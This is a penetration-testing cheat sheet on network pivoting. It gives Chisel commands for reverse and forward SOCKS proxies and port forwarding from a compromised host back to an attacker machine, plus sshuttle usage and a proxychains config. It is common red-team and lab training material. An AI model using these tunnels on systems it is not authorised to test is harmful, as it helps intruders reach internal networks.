# Pivoting Tools

## 1. Chisel

### Reverse SOCKS Proxy

On the Attacking Machine

```bash
./chisel server -p LISTEN_PORT --reverse &
```

On the Compromised Machine

```bash
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

> **Note:**
> Even though the compromised machine connects back to port `1337` (or whichever port you choose), the SOCKS proxy actually opens on `127.0.0.1:1080`. This is the default port for a SOCKS5 proxy.

To change the local proxy port from `1080` to a custom port:

```bash
./chisel client ATTACKING_IP:LISTEN_PORT R:PROXY_PORT:socks &
```

### Forward SOCKS Proxy

On the Compromised Machine

```bash
./chisel server -p LISTEN_PORT --socks5
```

On the Attacking Machine

```bash
./chisel client COMPROMISED_IP:LISTEN_PORT PROXY_PORT:socks
```

### Proxychains Reminder

When using proxychains to route traffic through the SOCKS proxy created by Chisel, edit your `/etc/proxychains.conf` (or `proxychains4.conf`) file as follows:

```ini
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

> Make sure to use `socks5` instead of `socks4`.

### Remote Port Forwarding

On the Attacking Machine

```bash
./chisel server -p LISTEN_PORT --reverse &
```

On the Compromised Machine

```bash
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

> This sets up a tunnel from the **attacker** to a **remote internal resource** via the compromised host.

### Local Port Forwarding

On the Compromised Machine

```bash
./chisel server -p LISTEN_PORT
```

On the Attacking Machine

```bash
./chisel client COMPROMISED_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

> This allows the attacker to access **internal services** from the compromised host locally

Notes

* Always verify which direction the port forwarding should happen.
* Use `&` to run processes in the background where necessary.
* Chisel uses **SOCKS5** by default for proxy setups.
* You can monitor or debug Chisel connections with tools like `netstat`, `lsof`, or `tcpdump`.

---

## 2. SSHuttle

`sshuttle` uses an SSH connection to create a tunneled proxy that acts like a new network interface. It effectively simulates a VPN, allowing us to route our traffic through the proxy **without** using tools like `proxychains`.

### Requirements

The following conditions must be met:

* `sshuttle` must be installed on **your** (attacking) machine.
* The **compromised server** must:
  * Run **Linux**.
  * Be accessible over **SSH**.
  * Have **Python** installed.

### Basic Usage

```bash
sshuttle -r username@address subnet
````

**Example:**

```bash
sshuttle -r user@172.16.0.5 172.16.0.0/24
```

### Auto-Detect Subnets (Optional)

Rather than specifying the subnet manually, you can use the `-N` option:

```bash
sshuttle -r username@address -N
```

> **Note:**
> This attempts to determine the subnets based on the compromised server’s routing table. It may not always work reliably.

### Using an SSH Key

If an SSH key is required for authentication:

```bash
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
```

**Example:**

```bash
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i ~/.ssh/id_rsa" 172.16.0.0/24
```

### Handling Broken Pipe Errors

If you encounter an error like:

```bash
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255
```

You can exclude the SSH server’s IP using the `-x` option:

```bash
sshuttle -r username@address subnet -x address
```

**Example:**

```bash
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```

Notes

* `sshuttle` works by tunneling IP traffic through an SSH connection.
* It simulates a VPN-like experience on-the-fly.
* Unlike `proxychains`, it doesn't require applications to support proxy settings.
* Great for routing entire toolsets or browser traffic through a pivot.

---
